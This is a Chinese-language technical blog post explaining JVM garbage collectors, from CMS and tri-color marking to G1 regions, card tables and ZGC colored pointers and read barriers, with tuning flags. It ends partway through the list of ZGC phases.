<p>Serial Old收集器是Serial收集器的老年代版本，它同样是一个单线程收集器。</p>
<p>他有两大用途：</p>
<p>1、在JDK1.5以及以前的版本中与Parallel Savenge收集器搭配使用</p>
<p>2、作为CMS收集器的备用方案</p>
<h2 id="Parallel-Scavenge收集器"><a href="#Parallel-Scavenge收集器" class="headerlink" title="Parallel Scavenge收集器"></a>Parallel Scavenge收集器</h2><p><code>-XX:+UseParallelGC   -XX:+UseParallelOldGC</code></p>
<p>Parallel收集器其实就i是Serial收集器的多线程版本，除了使用多线程进行垃圾回收之外，其他行为和Serial收集器类似。默认的收集线程和CPU核数一致。</p>
<p>Parallel收集器关注点是吞吐量，也就是高效率的使用CPU。而CMS更加关注于用户体验，也就是尽可能的是用户线程停顿时间短。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/15/huFoZtjYlANEa6G.jpg"
                      alt="Screenshot_44.jpg"
                ></p>
<p>新生代采用复制算法，老年代采用标记-整理算法</p>
<p>Parallel Old收集器是Parallel Scavenge收集器的老年代版本。</p>
<p>使用多线程和标记整理算法，在注重吞吐连和CPU资源的场合，可以优先考虑Parallel Scavenge收集器和Parallel Old收集器。<strong>这也是JDK1.8默认的垃圾收集器</strong></p>
<h2 id="ParNew收集器"><a href="#ParNew收集器" class="headerlink" title="ParNew收集器"></a>ParNew收集器</h2><p><code>-XX:+UseParNewGC</code></p>
<p>其实ParNew收集器跟Parallel收集器很类似，区别主要在于它可以和CMS收集器配合使用</p>
<p>新生代采用复制算法，老年代采用标记-整理算法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/15/huFoZtjYlANEa6G.jpg"
                      alt="Screenshot_44.jpg"
                ></p>
<p>注意：只有他才能和CMD收集器配合工作</p>
<h2 id="CMS收集器"><a href="#CMS收集器" class="headerlink" title="CMS收集器"></a>CMS收集器</h2><p><code>-XX:+UseConcMarkSweepGC(old)</code></p>
<p>CMS收集器是一种以获取最短回收停顿时间为目标的收集器。它非常看重用户的体验感。</p>
<p>它第一次实现了让垃圾收集线程和用户线程基本上同时工作</p>
<p>CMS收集器是一种“标记-清除算法”。它相对来说更为复杂一点。</p>
<p>主要分为四个步骤：</p>
<ul>
<li>初始标记：在这个阶段会暂停其他线程，并记录下gc root直接能引用的对象，速度较快。</li>
<li>并发标记：这个阶段会从Gc Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长，但是不需要暂停用户线程。</li>
<li>重新标记：重新标记阶段是为了修正并发标记期间因为用户程序进行运行而导致标记产生变动的那一部分的标记记录，这一阶段时间相对初始标记会长一些，但是远远比并发标记短！这里的主要算法是三色标记算法。</li>
<li>并发清理：开启用户线程，同时GC线程开始对未标记的区域做清扫。这个阶段出现新增对象会标记为黑色对象。</li>
<li>并发重置：对该次CMS垃圾回收中的数据结构进行重置，以便下次进行CMS。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/16/hAwbYHLnW2SOTtm.jpg"
                      alt="Screenshot_45.jpg"
                ></p>
<p>总的来说，我们可以看到垃圾收集线程是一致在工作的，而用户线程仅仅是在初始标记和重新标记的时候没有工作。</p>
<p>故而我们可以看到这个用户对于这个的体验应该是很好的，没有大量的STW产生！</p>
<p>CMS的主要优点也就出来了：并发收集、低停顿！</p>
<p><strong>CMS的相关核心参数</strong> </p>
<ol>
<li><p>-XX:+UseConcMarkSweepGC：启用cms </p>
</li>
<li><p>-XX:ConcGCThreads：并发的GC线程数 </p>
</li>
<li><p>-XX:+UseCMSCompactAtFullCollection：FullGC之后做压缩整理（减少碎片） </p>
</li>
<li><p>-XX:CMSFullGCsBeforeCompaction：多少次FullGC之后压缩一次，默认是0，代表每次FullGC后都会压缩一次</p>
</li>
<li><p>-XX:CMSInitiatingOccupancyFraction: 当老年代使用达到该比例时会触发FullGC（默认是92，这是百分比） </p>
</li>
<li><p>-XX:+UseCMSInitiatingOccupancyOnly：只使用设定的回收阈值(-XX:CMSInitiatingOccupancyFraction设定的值)，如果不指定，JVM仅在第一次使用设定值，后续则会自动调整 </p>
</li>
<li><p>-XX:+CMSScavengeBeforeRemark：在CMS GC前启动一次minor gc，目的在于减少老年代对年轻代的引 用，降低CMS GC的标记阶段时的开销，一般CMS的GC耗时 80%都在标记阶段 </p>
</li>
<li><p>-XX:+CMSParallellnitialMarkEnabled：表示在初始标记的时候多线程执行，缩短STW </p>
</li>
<li><p>-XX:+CMSParallelRemarkEnabled：在重新标记的时候多线程执行，缩短STW;</p>
</li>
</ol>
<p>然而由于在并发标记的过程中</p>
<p>可能出现原来被认为不是垃圾的又变成垃圾了，这就是多标——浮动垃圾。</p>
<h3 id="多标-浮动垃圾"><a href="#多标-浮动垃圾" class="headerlink" title="多标-浮动垃圾"></a>多标-浮动垃圾</h3><p>多标浮动垃圾在本轮GC中不会回收这部分内存，浮动垃圾不会影响垃圾回收的正确性，只需要等到下一轮垃圾回收中才被清除。</p>
<p>此外，针对并发标记（还有并发清理）开始后产生的新对象是，通常的做法是直接全部标记为黑色，本轮不会清除，委托给下一轮的GC，它也可以被称为浮动垃圾</p>
<p>除了多标外，还存在一种情况——漏标。</p>
<p><strong>漏标的具体解决在后续述说。</strong></p>
<h2 id="三色标记算法"><a href="#三色标记算法" class="headerlink" title="三色标记算法"></a>三色标记算法</h2><p>三色标记算法是CMS垃圾收集器的底层原理。</p>
<p>在并发标记的过程中，因为标记期间用户线程还在跑，对象之间的引用可能出现变化，多标和漏标的情况就有可能发生。注意我们前面说了多标的解决方法【其实委托给下一次GC就好啦</p>
<p>这里说下三色标记的三色说法：</p>
<p>我们把GcRoots可达性分析遍历对象过程中遇到的对象。按照“<strong>是否访问过</strong>”，标记成三种颜色：</p>
<ul>
<li>黑色：表示对象已经被垃圾收集器访问过，且这个对象的所有引用都已经被扫描过。黑色对象代表已经扫描过了，他是安全存活的！【我认为的是：该个对象的所有属性被扫描过了，它自己也被扫描过了！</li>
<li>灰色：表示对象已经被垃圾收集器访问过了，但是这个对象上至少存在一个引用还没有被扫描过。</li>
<li>白色：表示对象尚未被垃圾收集器访问过。显然在可达性分析一开始，所有的对象都是白色的。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/16/E3wjfRqs9J2nCGp.jpg"
                      alt="Screenshot_47.jpg"
                ></p>
<p>显而易见，灰色是一个中间态，最终整个老年代会变成黑白色。</p>
<p>根据CMS垃圾收集器，说下算法流程：</p>
<p>首先初始标记，会标记处GcRroots直接引用的对象。标记会黑色</p>
<p>接下来进行并发标记，开始可达性分析算法，会出现灰色和黑色！</p>
<p>在并发标记的过程会出现多标、漏标问题</p>
<p>所以进行重新标记把漏标问题解决。</p>
<p>最后并发清理，清理掉所以的白色对象。再进行并发重置，把相应的数据结构重置。</p>
<h3 id="漏标-读写屏障"><a href="#漏标-读写屏障" class="headerlink" title="漏标-读写屏障"></a>漏标-读写屏障</h3><p>漏标是因为：在灰色状态下，用户线程是继续执行的，那么可能某些引用会被当作垃圾误删，这是很严重的bug。</p>
<p>常见的两种解决办法：增量更新、原始快照</p>
<h3 id="增量更新IU"><a href="#增量更新IU" class="headerlink" title="增量更新IU"></a>增量更新IU</h3><p>当黑色对象插入新的指向白色对象的引用关系时，就将这个新插入的引用记录下来，等并发扫描结束之后，再将这些记录过的引用关系中黑色对象为根，重新扫描一次。</p>
<p><strong>简而言之，就是如果出现黑色对象插入新的对象时，这个新的对象是白色的，那么我们就把黑色对象记录下来。</strong></p>
<h3 id="原始快照-SATB"><a href="#原始快照-SATB" class="headerlink" title="原始快照-SATB"></a>原始快照-SATB</h3><p>原始快照就是当灰色对象要删除指向白色对象的引用关系时，就将这个要删除的引用记录下来。</p>
<p><strong>在并发扫描结束之后，把这个记录中白色对象变成黑色，成为浮动垃圾，留给下一次的GC处理。</strong></p>
<p>以上无论时对引用关系记录的插入还是删除，虚拟机的记录操作都是通过写屏障实现的。</p>
<p>读写屏障就是<strong>在写入和读入的前后可以进行处理操作，这些操作就被称为屏障。</strong></p>
<hr>
<p>现代追踪式（可达性分析）的垃圾回收器几乎都借鉴了三色标记的算法思想，尽管实现的方式不尽相同：比如白色&#x2F;黑色集合一般都不会出现（但是有其他体现颜色的地方）、灰色集合可以通过栈&#x2F;队列&#x2F;缓存日志等方式进行实现、遍历方式可以是广度&#x2F;深度遍历等等。 </p>
<p>对于读写屏障，以Java HotSpot VM为例，其并发标记时对漏标的处理方案如下： </p>
<p><strong>CMS：写屏障 + 增量更新</strong>  </p>
<p><strong>G1，Shenandoah：写屏障 + SATB</strong> </p>
<p><strong>ZGC：读屏障</strong> </p>
<p>工程实现中，读写屏障还有其他功能，比如写屏障可以用于记录跨代&#x2F;区引用的变化，读屏障可以用于支持移动对象的并发执行等。功能之外，还有性能的考虑，所以对于选择哪种，每款垃圾回收器都有自己的想法。</p>
<h2 id="G1收集器"><a href="#G1收集器" class="headerlink" title="G1收集器"></a>G1收集器</h2><p>G1收集器是一款面对服务器的垃圾收集器，主要正对配备多克处理器及大容量内存的机器，以极高概率满足GC停顿时间要求的同时，具备高吞吐量性能特征。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/20/y3YaDfTBNuLQ7HZ.jpg"
                      alt="Screenshot_48.jpg"
                ></p>
<p>G1将Java堆划分为多个大小相等的独立区域（<strong>Region</strong>），JVM最多可以有2048个Region。 </p>
<p>一般Region大小等于堆大小除以2048，比如堆大小为4096M，则Region大小为2M，当然也可以用参数”<code>-XX:G1HeapRegionSize</code>“手动指定Region大小，但是推荐默认的计算方式。 </p>
<p>G1保留了年轻代和老年代的概念，但不再是物理隔阂了，它们都是（可以不连续）Region的集合。 </p>
<p>【注意是逻辑上分代，而不是物理上分代了</p>
<p>默认年轻代对堆内存的占比是5%，如果堆大小为4096M，那么年轻代占据200MB左右的内存，对应大概是100个Region，可以通过“<code>-XX:G1NewSizePercent</code>”设置新生代初始占比，在系统运行中，JVM会不停的给年轻代增加更多的Region，但是最多新生代的占比不会超过60%，可以通过“<code>-XX:G1MaxNewSizePercent</code>”调整。年轻代中的Eden和Survivor对应的region也跟之前一样，默认8:1:1，假设年轻代现在有1000个region，eden区对应800个，s0对应100个，s1对应100个。 </p>
<p>一个Region可能之前是年轻代，如果Region进行了垃圾回收，之后可能又会变成老年代，也就是说Region的区域功能可能会动态变化。 </p>
<p>G1垃圾收集器对于对象什么时候会转移到老年代跟之前讲过的原则一样，<strong>唯一不同的是对大对象的处理</strong>，G1有专门分配大对象的Region叫<strong>Humongous区</strong>，而不是让大对象直接进入老年代的Region中。</p>
<p>在G1中，大对象的判定规则就是一个大对象超过了一个Region大小的50%，比如按照上面算的，每个Region是2M，只要一个大对象超过了1M，就会被放入Humongous中，而且一个大对象如果太大，可能会横跨多个Region来存放。 </p>
<p>Humongous区专门存放短期巨型对象，不用直接进老年代，可以节约老年代的空间，避免因为老年代空间不够的GC开销。</p>
<p>Full GC的时候除了收集年轻代和老年代之外，也会将Humongous区一并回收。 </p>
<h3 id="G1收集器的特点"><a href="#G1收集器的特点" class="headerlink" title="G1收集器的特点"></a>G1收集器的特点</h3><p>G1收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的Region(这也就是它的名字Garbage-First的由来)。比如一个Region花200ms能回收10M垃圾，另外一个Region花50ms能回收20M垃圾，在回收时间有限情况下，G1当然会优先选择后面这个Region回收。这种使用Region划分内存空间以及有优先级的区域回收方式，保证了G1收集器在有限时间内可以尽可能高的收集效率。</p>
<p>G1收集器被视为JDK1.7以上版本Java虚拟机的一个重要进化特征。它具备以下特点:</p>
<ol>
<li>并行与并发：G1能充分利用CPU、多核环境下的硬件优势，使用多个CPU来缩短STW停顿时间。相比之下，部分其他收集器原本需要停顿Java线程来执行GC动作，G1收集器仍然可以通过并发的方式让java程序继续执行。</li>
<li>分代收集: 虽然G1可以不需要其他收集器配合就能独立管理整个GC堆，但是还是保留了分代的概念。</li>
<li>空间整合:与CMS的标记清理算法不同，G1从整体来看是基于标记压缩算法实现的收集器是，从局部上来看是基于<strong>标志复制</strong>算法实现的。</li>
<li>可预测的停顿: 这是G1相对于CMS的另一个大优势， 降低停顿时间是G1和CMS共同的关注点，但G1除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个时间片段(通过参数 <code>-XX:MaxGCPauseMillis</code> 指定)内完成垃圾收集。</li>
</ol>
<h3 id="G1中的三种GC"><a href="#G1中的三种GC" class="headerlink" title="G1中的三种GC"></a>G1中的三种GC</h3><p><strong>Young GC</strong></p>
<p>Young GC并不是说现有的Eden区放满了就会马上触发，G1会计算下现在Eden区回收大概要多久时间，如果回收时间远远小于参数 <code>XX:MaxGCPauseMills</code> 设定的值，那么增加年轻代的Region，继续给新对像存放，不会马上做Young GC。直到下一次Eden区放满，<strong>G1计算回收时间接近参数 <code>XX:MaxGCPauseMills</code> 设定的值，那么就会触发Young GC。</strong></p>
<p><strong>Mixed GC</strong></p>
<p>Mixed GC是G1中特有的GC方式，它不是Full GC。老年代的堆占有率达到参数<code>-XX:InitiatingHeapOccupancyPercent</code>设定的值则触发，回收所有的年轻代和<strong>部分老年代</strong>(根据期望的GC停顿时间确定old区垃圾收集的优先顺序)以及大对象区，正常情况G1的垃圾收集是先做MixedGC，主要使用复制算法，需要把各个Region中存活的对象拷贝到别的Region里去，拷贝过程中如果发现没有足够的空Region能够承载拷贝对象就会触发一次Full GC。</p>
<p><strong>Full GC</strong></p>
<p>停止系统程序，然后采用单线程（在Shanandoah垃圾收集器中实现了多线程）进行标记、清理和压缩整理，好空闲出来一批Region来供下一 次Mixed GC使用， 这个过程是非常耗时的。</p>
<h3 id="G1垃圾收集流程"><a href="#G1垃圾收集流程" class="headerlink" title="G1垃圾收集流程"></a>G1垃圾收集流程</h3><p>Mixed GC收集的步骤和CMS收集器垃圾回收步骤相似，如下图所示：</p>
<p><a href="https://i.loli.net/2020/10/17/WxGHbBFjcmC7Jzr.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/17/WxGHbBFjcmC7Jzr.jpg"
                      alt="jvm19.jpg"
                ></a></p>
<ol>
<li><p>初始标记：暂停所有的其他线程(STW)，并记录下gc roots直接能引用的对象，速度很快</p>
</li>
<li><p>并发标记：同CMS的并发标记(无STW)</p>
</li>
<li><p>最终标记：同CMS的重新标记(STW)</p>
</li>
<li><p>筛选回收：筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间(<code>XX:MaxGCPauseMillis</code> 指定)来制定回收计划。</p>
<p> 比如说老年代此时有1000个Region都满了，但是因为根据预期停顿时间，本次垃圾回收可能只能停顿200ms，那么通过之前回收成本计算得知，<strong>可能回收其中800个Region刚好需要200ms</strong>，那么就只会回收800个Region，是为了尽量把GC导致的停顿时间控制在我们指定的范围内。</p>
<p>这个阶段其实也可以做到与用户程序起并发执行(在Shanandoah垃圾收集器中实现了并发)， <strong>但是因为只回收部分Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率</strong>。</p>
<p><strong>不管是年轻代或是老年代，回收算法主要用的是标记复制算法，将一个Region中的存活对象复制到另一个Region中，这种不会像CMS那样回收完由于存在很多内存碎片还需要进行整理。</strong></p>
</li>
</ol>
<blockquote>
<p><strong>G1收集器参数设置</strong> </p>
<p>-XX:+UseG1GC:使用G1收集器 </p>
<p>-XX:ParallelGCThreads:指定GC工作的线程数量 </p>
<p>-XX:G1HeapRegionSize:指定分区大小(1MB~32MB，且必须是2的N次幂)，默认将整堆划分为2048个分区 </p>
<p>-XX:MaxGCPauseMillis:目标暂停时间(默认200ms) </p>
<p>-XX:G1NewSizePercent:新生代内存初始空间(默认整堆5%) </p>
<p>-XX:G1MaxNewSizePercent:新生代内存最大空间 </p>
<p>-XX:TargetSurvivorRatio:Survivor区的填充容量(默认50%)，Survivor区域里的一批对象(年龄1+年龄2+年龄n的多个年龄对象)总和超过了Survivor区域的50%，此时就会把年龄n(含)以上的对象都放入老年代 </p>
<p>-XX:MaxTenuringThreshold:最大年龄阈值(默认15) </p>
<p>-XX:InitiatingHeapOccupancyPercent:老年代占用空间达到整堆内存阈值(默认45%)，则执行新生代和老年代的混合收集(<strong>MixedGC</strong>)，比如我们之前说的堆默认有2048个region，如果有接近1000个region都是老年代的region，则可能就要触发MixedGC了 </p>
<p>-XX:G1MixedGCLiveThresholdPercent(默认85%) region中的存活对象低于这个值时才会回收该region，如果超过这个值，存活对象过多，回收的的意义不大。 </p>
<p>-XX:G1MixedGCCountTarget:在一次回收过程中指定做几次筛选回收(默认8次)，在最后一个筛选回收阶段可以回收一会，然后暂停回收，恢复系统运行，一会再开始回收，这样可以让系统不至于单次停顿时间过长。 </p>
<p>-XX:G1HeapWastePercent(默认5%): gc过程中空出来的region是否充足阈值，在混合回收的时候，对Region回收都是基于复制算法进行的，都是把要回收的Region里的存活对象放入其他Region，然后这个Region中的垃圾对象全部清理掉，这样的话在回收过程就会不断空出来新的Region，一旦空闲出来的Region数量达到了堆内存的5%，此时就会立即停止混合回收，意味着本次混合回收就结束了。</p>
</blockquote>
<h3 id="G1垃圾收集器优化建议"><a href="#G1垃圾收集器优化建议" class="headerlink" title="G1垃圾收集器优化建议"></a><strong>G1垃圾收集器优化建议</strong></h3><p>假设参数 -XX:MaxGCPauseMills 设置的值很大，导致系统运行很久，年轻代可能都占用了堆内存的60%了，此时才 </p>
<p>触发年轻代gc。 </p>
<p>那么存活下来的对象可能就会很多，此时就会导致Survivor区域放不下那么多的对象，就会进入老年代中。 </p>
<p>或者是你年轻代gc过后，存活下来的对象过多，导致进入Survivor区域后触发了动态年龄判定规则，达到了Survivor </p>
<p>区域的50%，也会快速导致一些对象进入老年代中。所以这里核心还是在于调节 -XX:MaxGCPauseMills 这个参数的值，在保证他的年轻代gc别太频繁的同时，还得考虑 </p>
<p>每次gc过后的存活对象有多少,避免存活对象太多快速进入老年代，频繁触发mixed gc. </p>
<h3 id="记忆集与卡表"><a href="#记忆集与卡表" class="headerlink" title="记忆集与卡表"></a>记忆集与卡表</h3><p>在新生代做GC Roots可达性扫描过程中可能会碰到<strong>跨代引用</strong>的对象，这种如果又去对老年代再去扫描效率太低了。为此，在新生代可以引入<strong>记忆集（Remember Set）</strong>的数据结构来记录从非收集区到收集区的指针集合，避免把整个老年代加入GC Roots扫描范围。事实上并不只是新生代、 老年代之间才有跨代引用的问题， 所有涉及部分区域收集（Partial GC）行为的垃圾收集器， 典型的如G1、 ZGC和Shenandoah收集器， 都会面临相同的问题。</p>
<p>垃圾收集场景中，收集器只需通过记忆集判断出某一块非收集区域是否存在指向收集区域的指针即可，无需了解跨代引用指针的全部细节。Hotspot使用一种叫做**卡表(Card Table)**的方式实现记忆集，也是目前最常用的一种方式。关于卡表与记忆集的关系，可以类比为Java语言中HashMap与Map的关系。</p>
<p>卡表是使用一个字节数组实现：<code>CARD_TABLE[ ]</code>，每个元素对应着其标识的内存区域一块特定大小的内存块，称为**卡页(Card Page)**。HotSpot使用的卡页大小是<code>2^9</code>，即512字节。如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/06/ixhZGnsWMet6j8K.png"
                      alt="Snipaste_2021-11-06_17-33-45.png"
                ></p>
<p>一个卡页中可包含多个对象，<strong>只要有一个对象的字段存在跨代指针，其对应的卡表的元素标识就变成1</strong>，表示该元素变脏，否则为0。</p>
<p>GC时，只要筛选本收集区的卡表中变脏的元素加入GC Roots里。但是如何让卡表变脏，即发生引用字段赋值时，如何更新卡表对应的标识为1？Hotspot使用<strong>写屏障</strong>维护卡表状态。当老年代对象引用年轻代对象时，通过写屏障修改年轻代中的对应卡表。</p>
<h3 id="什么场景适合使用G1"><a href="#什么场景适合使用G1" class="headerlink" title="什么场景适合使用G1"></a><strong>什么场景适合使用G1</strong></h3><p>50%以上的堆被存活对象占用 </p>
<p>对象分配和晋升的速度变化非常大 </p>
<p>垃圾回收时间特别长，超过1秒 </p>
<p>8GB以上的堆内存(建议值) </p>
<p>停顿时间是500ms以内 </p>
<h1 id="ZGC垃圾收集器简介"><a href="#ZGC垃圾收集器简介" class="headerlink" title="ZGC垃圾收集器简介"></a>ZGC垃圾收集器简介</h1><p>ZGC是一款<strong>JDK 11</strong>中新加入的具有实验性质的低延迟垃圾收集器，ZGC可以说源自于是Azul System公司开发的C4（Concurrent Continuously Compacting Collector）收集器。</p>
<p>参考文章：</p>
<ul>
<li><a class="link"   href="https://wiki.openjdk.java.net/display/zgc/Main" >https://wiki.openjdk.java.net/display/zgc/Main<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://cr.openjdk.java.net/~pliden/slides/ZGC-Jfokus-2018.pdf" >http://cr.openjdk.java.net/~pliden/slides/ZGC-Jfokus-2018.pdf<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>ZGC的目标主要有以下四个：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/07/LJHykojO17gaYPS.png"
                      alt="Snipaste_2021-11-07_16-27-36.png"
                ></p>
<ul>
<li><strong>支持TB量级的堆</strong>：我们生产环境的硬盘还没有上TB，这应该可以满足未来十年内，所有JAVA应用的需求了。</li>
<li><strong>最大GC停顿时间不超10ms</strong>：目前一般线上环境运行良好的JAVA应用Minor GC停顿时间在10ms左右，而Old GC一般都需要100ms以上（G1垃圾收集器可以调节停顿时间，但是如果调的过低的话，反而会适得其反），ZGC垃圾收集器之所以能做到这一点是因为它的停顿时间主要跟GC Roots扫描有关，而GC Roots数量和堆大小是没有任何关系的。</li>
<li><strong>奠定未来GC特性的基础</strong>。</li>
<li>**最糟糕的情况下吞吐量会降低15%**：这都不是事，停顿时间足够优秀。至于吞吐量，通过扩容就可以解决。</li>
</ul>
<p>另外，Oracle官方提到了它最大的优点是：它的停顿时间不会随着堆的增大而增长！也就是说，几十G堆的停顿时间是10ms以下，几百G甚至上T堆的停顿时间也是10ms以下。</p>
<h2 id="未实现分代"><a href="#未实现分代" class="headerlink" title="未实现分代"></a>未实现分代</h2><p>ZGC垃圾收集器暂时没有实现分代。我们知道以前的垃圾回收器之所以分代，是因为对象的声明周期都不一致，一些是朝生夕死的，而另一些是长期存活的，因此通过对堆内存的分代可以更方便地对对象进行分代管理。那么为什么ZGC就不分代呢？<strong>因为分代实现起来麻烦，作者就先实现出一个比较简单可用的单代版本，后续会优化。</strong></p>
<h2 id="内存分布"><a href="#内存分布" class="headerlink" title="内存分布"></a>内存分布</h2><p>ZGC收集器是一款基于Region内存布局的(与G1收集器相似)，暂时不设分代的， 使用了<strong>读屏障、 颜色指针</strong>等技术来实现可并发的<strong>标记整理算法</strong>的， 以低延迟为首要目标的一款垃圾收集器。ZGC的Region可以具有大、 中、 小三类容量：</p>
<ul>
<li>小型Region（Small Region） ：容量固定为2MB， 用于放置小于256KB的小对象。</li>
<li>中型Region（Medium Region） ：容量固定为32MB， 用于放置大于等于256KB但小于4MB的对象。</li>
<li>大型Region（Large Region）：<strong>容量不固定， 可以动态变化， 但必须为2MB的整数倍， 用于放置4MB或以上的大对象。 每个大型Region中只会存放一个大对象， 但它的实际容量完全有可能小于中型Region， 最小容量可低至4MB</strong>。 大型Region在ZGC的实现中是不会被重分配（重分配是ZGC的一种处理动作，用于复制对象的收集器阶段， 稍后会介绍到）的， 因为复制一个大对象的代价非常高昂。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/07/jkAMrFptx9XGdC4.png"
                      alt="Snipaste_2021-11-07_16-32-36.png"
                ></p>
<h2 id="NUMA-aware"><a href="#NUMA-aware" class="headerlink" title="NUMA-aware"></a>NUMA-aware</h2><p>NUMA对应的有UMA，UMA即Uniform Memory Access Architecture，NUMA就是Non Uniform Memory Access Architecture。</p>
<p>UMA表示内存只有一块，所有CPU都去访问这一块内存，那么就会存在竞争问题（争夺内存总线访问权），有竞争就会有锁，有锁效率就会受到影响，而且CPU核心数越多，竞争就越激烈。</p>
<p>而NUMA每个CPU对应有一块内存，且这块内存在主板上离这个CPU是最近的，每个CPU优先访问这块内存，那效率自然就提高了：【实际上就是各个CPU有自己的所属地</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1031/223830_96d75f67_8183653.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1031/223830_96d75f67_8183653.png"
                      alt="输入图片说明"
                ></a></p>
<p>服务器的NUMA架构在中大型系统上一直非常盛行，也是高性能的解决方案，尤其在系统延迟方面表现都很优秀。<strong>ZGC是能自动感知NUMA架构并充分利用NUMA架构特性的。</strong></p>
<h1 id="颜色指针"><a href="#颜色指针" class="headerlink" title="颜色指针"></a>颜色指针</h1><p>颜色指针，即Colored Pointers，是ZGC的核心设计之一。<strong>以前的垃圾回收器的GC信息保存在对象头或独立的数据结构中，而ZGC的GC信息保存在指针中</strong>。如果将GC相关信息保存在对象头中会有什么问题？我们说垃圾收集器其实并不关注对象本身的信息，而仅仅关注它的引用，比如我们所说的<strong>三色标记</strong>其实和对象本身并没有关系，本质上只和对象的引用有关。如果将GC信息记录在对象头上，而对象发生了移动，我们可能就无法成功访问了，这样就需要耗费额外的成本去维护。而ZGC垃圾收集器直接将对象的GC信息记录在了对象指针上，如下图所示(64位机器)：</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1031/224521_07caa045_8183653.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1031/224521_07caa045_8183653.png"
                      alt="输入图片说明"
                ></a></p>
<p>每个对象有一个64位指针，这64位被分为：</p>
<ul>
<li>18位：预留给以后使用</li>
<li>1位：Finalizable标识，此位与并发引用处理有关，它表示这个对象只能通过finalize()方法才能访问</li>
<li>1位：Remapped标识，标识是否进入了重分配集（需要被回收Region的集合），即是否被移动过</li>
<li>1位：Marked1标识，用于标识指针的<strong>三色状态</strong>，辅助GC</li>
<li>1位：Marked0标识，和上面的Marked1作用相同</li>
<li>42位：对象的地址（所以它可以支持2^42&#x3D;4T内存）</li>
</ul>
<p>通过对配置ZGC后对象指针分析我们可知，对象指针必须是64位，那么ZGC就无法支持32位操作系统。同样的也就无法支持<strong>指针压缩</strong>了（CompressedOops，压缩指针将64位指针压缩成32位）。那么颜色指针有什么优势?</p>
<ol>
<li>一旦某个Region的存活对象被移走之后，这个Region立即就能够被释放和重用掉，而不必等待整个堆中所有指向该Region的引用都被修正后才能清理，这使得理论上只要还有一个空闲Region，ZGC就能完成收集。</li>
<li>颜色指针可以大幅减少在垃圾收集过程中内存屏障的使用数量，ZGC只使用了<strong>读屏障</strong>。</li>
<li>颜色指针具备强大的扩展性，它可以作为一种可扩展的存储结构用来记录更多与对象标记、重定位过程相关的数据，以便日后进一步提高性能。</li>
</ol>
<h1 id="读屏障"><a href="#读屏障" class="headerlink" title="读屏障"></a>读屏障</h1><p>之前的GC都是采用Write Barrier，即写屏障。这次ZGC采用了完全不同的方案读屏障，这个是ZGC一个非常重要的特性。在标记和移动对象的阶段，每次从堆里对象的引用类型中读取一个指针的时候，都需要加上一个Load Barriers。</p>
<p>那么我们该如何理解它呢？看下面的代码，第一行代码我们尝试读取堆中的一个对象引用<code>obj.fieldA</code>并赋给引用<code>o</code>（fieldA也是一个对象时才会加上读屏障）。如果这时候对象在GC时被移动了，接下来JVM就会加上一个读屏障，这个读屏障会把读出的指针更新到对象的新地址上，并且把堆里的这个指针修正到原本的字段里。这样就算GC把对象移动了，读屏障也会发现并修正指针，于是应用代码就永远都会持有更新后的有效指针，而且不需要STW。那么，JVM是如何判断对象被移动过呢？就是利用上面提到的<strong>颜色指针</strong>中的四位，如果指针是<code>Bad Color</code>，那么程序还不能往下执行，需要先修正指针；如果指针是<code>Good Color</code>，那么正常往下执行即可：</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1101/093013_540ff9c4_8183653.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1101/093013_540ff9c4_8183653.png"
                      alt="输入图片说明"
                ></a></p>
<p>后面3行代码都不需要加读屏障：<code>Object p = o</code>这行代码并没有从堆中读取数据；<code>o.doSomething()</code>也没有从堆中读取数据；<code>obj.fieldB</code>不是对象引用，而是原子类型。正是因为Load Barriers的存在，所以会导致配置ZGC的应用的吞吐量会变低。官方的测试数据是需要多出额外4%的开销。</p>
<h1 id="ZGC执行流程"><a href="#ZGC执行流程" class="headerlink" title="ZGC执行流程"></a>ZGC执行流程</h1><p>ZGC的运作过程大致可划分为以下四个大的阶段：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/07/MaoCmEUJXHLqkn8.png"
                      alt="Snipaste_2021-11-07_16-43-13.png"
                ></p>
<ul>
<li><p><strong>并发标记（Concurrent Mark）</strong>：与G1一样，并发标记是遍历对象图做可达性分析的阶段，它的初始标记 (<strong>Mark Start</strong> 相当于G1的初始标记) 和最终标记 (<strong>Mark End</strong>) 也会出现短暂的停顿，与G1不同的是， ZGC的标记是在<strong>指针</strong>上而不是在对象上进行的， 标记阶段会更新染色指针中的Marked 0、 Marked1标志位。</p>
</li>
<li><p><strong>并发预备重分配（Concurrent Prepare for Relocate）</strong>：这个阶段需要根据特定的查询条件统计得出本次收集过程要清理哪些Region，将这些Region组成重分配集（Relocation Set）。ZGC每次回收都会扫描所有的Region，用范围更大的扫描成本换取省去G1中<strong>记忆集</strong>的维护成本。</p>
</li>
